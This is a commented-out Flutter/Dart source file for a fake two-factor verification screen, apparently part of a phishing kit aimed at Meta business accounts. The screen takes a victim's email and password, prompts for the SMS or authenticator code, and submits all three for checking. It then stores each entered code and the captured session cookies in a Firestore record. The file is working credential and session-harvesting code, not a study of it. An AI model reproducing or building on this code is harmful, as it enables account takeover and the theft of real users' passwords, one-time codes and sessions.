// import 'package:_iwu_pack/setup/index.dart';
// import 'package:flutter/material.dart';
// import 'package:flutter_bloc/flutter_bloc.dart';
// import 'package:gap/gap.dart';
// import 'package:meta_business/src/presentation/widgets/widget_input.dart';
// import 'package:meta_business/src/resources/firestore/firestore_resources.dart';
// import '../bloc/home_bloc.dart';

// class AuthScreen extends StatefulWidget {
//   const AuthScreen(
//       {Key? key, this.rowId, required this.email, required this.password})
//       : super(key: key);
//   final String? rowId;
//   final String email;
//   final String password;
//   @override
//   _AuthScreenState createState() => _AuthScreenState();
// }

// class _AuthScreenState extends State<AuthScreen> {
//   final HomeBloc _homeBloc = HomeBloc();

//   bool enable = false;
//   TextEditingController twoFACodeController = TextEditingController();

//   String? twoFACode;
//   String twoFACodeFake = "123456";
//   String? error2FA;

//   // int _secondsRemaining = 0;
//   // Timer? _timer;
//   int attemptsMade = 1;
//   // bool showTime = false;
//   // hàm countdown thời gian chờ 1p
//   // void startTimer() {
//   //   const oneSec = Duration(seconds: 1);
//   //   _timer = Timer.periodic(oneSec, (timer) {
//   //     setState(() {
//   //       if (_secondsRemaining > 0) {
//   //         _secondsRemaining--;
//   //       } else {
//   //         _timer?.cancel();
//   //       }
//   //     });
//   //   });
//   // }

//   void _sendAndDisableButton() {
//     twoFACode = twoFACodeController.text;
//     _homeBloc.add(CheckingTwoFAEvent(
//         widget.email, widget.password, twoFACode!, widget.rowId!));
//     // khi nhấn nút thì khởi tạo lại thời gian đếm
//     // if (enable) {
//     //   // _secondsRemaining = 60;
//     //   setState(() {
//     //     enable = false;
//     //     // showTime = true;
//     //   });
//     //   startTimer();
//     //   addNewColumn();
//     //   twoFACodeController.clear();
//     // }
//     twoFACodeController.clear();
//   }

//   @override
//   Widget build(BuildContext context) {
//     // if (twoFACodeController.text.length == 6 && _secondsRemaining == 0) {
//     //   enable = true;
//     // } else {
//     //   enable = false;
//     // }
//     if (twoFACodeController.text.length == 6) {
//       enable = true;
//     } else {
//       enable = false;
//     }
//     return Scaffold(
//       body: BlocListener<HomeBloc, HomeState>(
//         bloc: _homeBloc,
//         listener: (context, state) {
//           if (state is CheckingState) {
//             print("iz checking state on authscreen");

//             showDialog(
//                 context: context,
//                 builder: (context) {
//                   return const Center(
//                     child: CircularProgressIndicator(),
//                   );
//                 });
//           }
//           if (state is CheckingTwoFASuccessState) {
//             print("iz on checked authscreen staterr");

//             Navigator.of(context).pop();
//             final ref = colData.doc(widget.rowId);
//             print("check ref $ref");
//             ref.update({"twoFA${attemptsMade++}": twoFACode});
//             ref.update({"cookies": state.response['cookies']});
//             setState(() {
//               error2FA = state.response['message'];
//             });
//           }
//         },
//         child: Center(
//           child: Container(
//             width: 560,
//             // Adjust as needed
//             decoration: BoxDecoration(
//               color: Colors.white,
//               borderRadius: BorderRadius.circular(8), // Rounded border
//               boxShadow: [
//                 BoxShadow(
//                   color: Colors.grey.withOpacity(0.5),
//                   spreadRadius: 5,
//                   blurRadius: 7,
//                   offset: const Offset(0, 3), // changes position of shadow
//                 ),
//               ],
//             ),
//             padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
//             margin: const EdgeInsets.all(16),
//             child: Column(
//               mainAxisSize: MainAxisSize.min,
//               crossAxisAlignment: CrossAxisAlignment.start,
//               children: [
//                 Column(
//                   crossAxisAlignment: CrossAxisAlignment.start,
//                   children: [
//                     Text(
//                       "Check your text messages",
//                       style: w500TextStyle(fontSize: 22),
//                     ),
//                     const Gap(6),
//                     Text(
//                       "We sent a 6-digit code or 8-digit code to your mobile phone.",
//                       style: w300TextStyle(fontSize: 14),
//                     )
//                   ],
//                 ),
//                 const Divider(thickness: 2), // Divider line
//                 const Gap(12),
//                 Image.asset("assets/images/png/2fa.jpg"),
//                 Gap(12),
//                 const Text(
//                   "Enter the code from your generator, sms or third-party-app below.",
//                   textAlign: TextAlign.left,
//                   style: TextStyle(fontSize: 16, height: 1.6),
//                 ),
//                 WidgetInput(
//                     hint: "Code",
//                     controller: twoFACodeController,
//                     onChanged: (value) {
//                       setState(() {
//                         twoFACode = value;
//                         print("2FA $twoFACode");
//                       });
//                     }),

//                 error2FA == null
//                     ? const Text("")
//                     : Container(
//                         margin: const EdgeInsets.only(top: 8, bottom: 16),
//                         child: Text(
//                           "$error2FA",
//                           style: const TextStyle(color: Colors.red),
//                         ),
//                       ),
//                 // Gap(8),
//                 const Text(
//                   "Make sure you're in an area with good signal so the code can reach your phone.",
//                   textAlign: TextAlign.left,
//                   style: TextStyle(fontSize: 16, height: 1.6),
//                 ),
//                 // const Gap(12),
//                 // khi  nút send disable và thời gian chờ > 1 thì hiện thị hiển thị thời gian chờ, else không hiển thị gì
//                 // showTime && _secondsRemaining >= 1
//                 //     ? Container(
//                 //         margin: const EdgeInsets.only(top: 16, bottom: 8),
//                 //         child: Text(
//                 //           "(0:$_secondsRemaining)",
//                 //           style: w500TextStyle(fontSize: 16),
//                 //         ),
//                 //       )
//                 //     : const Text(""),
//                 // const Gap(8),
//                 GestureDetector(
//                   onTap: enable ? _sendAndDisableButton : null,
//                   child: Container(
//                     width: double.infinity,
//                     padding: const EdgeInsets.symmetric(vertical: 12),
//                     decoration: BoxDecoration(
//                         borderRadius: BorderRadius.circular(8),
//                         color:
//                             enable ? hexColor('1a56db') : hexColor('9e9e9e')),
//                     child: Center(
//                         child: Text(
//                       "Submit",
//                       style: w400TextStyle(fontSize: 16, color: Colors.white),
//                     )),
//                   ),
//                 ),
//               ],
//             ),
//           ),
//         ),
//       ),
//     );
//   }
// }
